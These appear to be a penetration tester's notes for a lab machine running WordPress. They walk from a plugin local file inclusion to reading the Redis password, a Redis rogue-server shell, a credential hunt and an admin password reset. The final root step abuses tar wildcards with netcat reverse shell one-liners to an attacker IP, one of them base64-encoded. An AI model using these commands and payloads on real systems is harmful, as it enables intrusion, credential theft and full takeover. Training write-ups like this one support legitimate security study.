### wp-scan
* `wpscan --url http://$IP/ --enumerate` <- Enum mode won't find any plugins by default. 
* `-e ap,t,tt,u` to enumerate all plugins, popular themes, timthumbs, and users
* `wpscan --url http://$IP/ --api-token <SNIP>`

```bash
[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://192.168.200.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.200.166/wp-content/plugins/site-editor/readme.txt
```

* http://192.168.200.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
* http://192.168.200.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis
* .conf 
* /redis.conf <- It works

https://redis.io/docs/manual/config/

```creds
requirepass "hello world"

Ready4Redis?
```

```bash
redis-cli -h $IP -a Ready4Redis?
```

* https://github.com/A1vinSmith/redis-rogue-getshell
* https://github.com/A1vinSmith/redis-rogue-server

```bash
python3 redis-rogue-server.py --rhost 192.168.200.166 --rport 6379 --lhost 192.168.49.200 --lport 6379 --auth "Ready4Redis?"
```

### Foothold
```bash
cat /etc/passwd | grep -i 'bash'
root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000::/home/alice:/bin/bash

find / -user alice 2>/dev/null

grep --color=auto -rnw '/var/www/html/' -ie "PASSWORD=" --color=always 2>/dev/null
grep --color=auto -rnw '/var/www/html/' -ie "PASSWORD" --color=always 2>/dev/null

find / -user alice -not -path "/var/www/html/*" 2>/dev/null
```

wp-config.php
```
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'karl' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Wordpress1234' );
```

```MariaDB [wordpress]> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email    | user_url         | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0 | admin         | test@test.com | http://localhost | 2021-07-11 16:35:27 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------+------------------+---------------------+---------------------+-------------+--------------+
```

### Lateral Movement
Update the password for that.
```
UPDATE wp_users SET user_pass=MD5('alvin') WHERE ID = 1;
```

admin:alvin -> wordpress 404 to get in.

### Root 
Obviously `tar` wildcard with `/etc/crontab`

```bash port 4242
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.200 4242 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch /var/www/html/--checkpoint=1
```

```bash port 80
echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS4yMDAgODAgPi90bXAvZg== | base64 -d > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Both worked.
